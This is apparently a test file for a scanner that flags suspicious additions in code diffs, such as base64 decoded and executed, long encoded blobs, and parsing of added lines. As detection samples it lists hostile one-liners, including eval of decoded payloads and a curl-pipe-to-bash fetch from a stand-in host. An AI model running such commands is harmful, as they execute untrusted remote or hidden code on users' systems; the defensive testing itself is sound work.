import assert from "node:assert/strict";
import { test } from "node:test";

import { findSuspicious, parseAddedLines } from "./check-suspicious.mjs";

const blob = "QUFB".repeat(60);

test("flags code that decodes base64 and runs it", () => {
  for (const line of [
    "eval(atob(payload))",
    "new Function(Buffer.from(s, 'base64').toString())()",
    'execSync(Buffer.from(cmd, "base64").toString())',
    "echo aGk= | base64 -d | sh",
    "curl -fsSL https://x.example/i.sh | bash",
  ]) {
    assert.equal(
      findSuspicious([{ file: "a.ts", line: 1, text: line }]).length,
      1,
      line,
    );
  }
});

test("flags a long base64 blob", () => {
  const hits = findSuspicious([
    { file: "src/a.ts", line: 3, text: `const x = "${blob}";` },
  ]);
  assert.equal(hits.length, 1);
  assert.match(hits[0].reason, /base64/);
});

test("ignores ordinary code, skipped files and allow comments", () => {
  assert.deepEqual(
    findSuspicious([
      {
        file: "src/a.ts",
        line: 1,
        text: "const s = Buffer.from(file).toString('base64');",
      },
      { file: "pnpm-lock.yaml", line: 1, text: `integrity: sha512-${blob}` },
      { file: "icon.svg", line: 1, text: blob },
      {
        file: "src/a.ts",
        line: 2,
        text: `const x = "${blob}"; // allow-base64`,
      },
    ]),
    [],
  );
});

test("parses added lines from a unified diff", () => {
  const diff = [
    "diff --git a/x.ts b/x.ts",
    "+++ b/x.ts",
    "@@ -1,0 +5,2 @@",
    "+one",
    "+two",
    "-gone",
  ].join("\n");
  assert.deepEqual(parseAddedLines(diff), [
    { file: "x.ts", line: 5, text: "one" },
    { file: "x.ts", line: 6, text: "two" },
  ]);
});
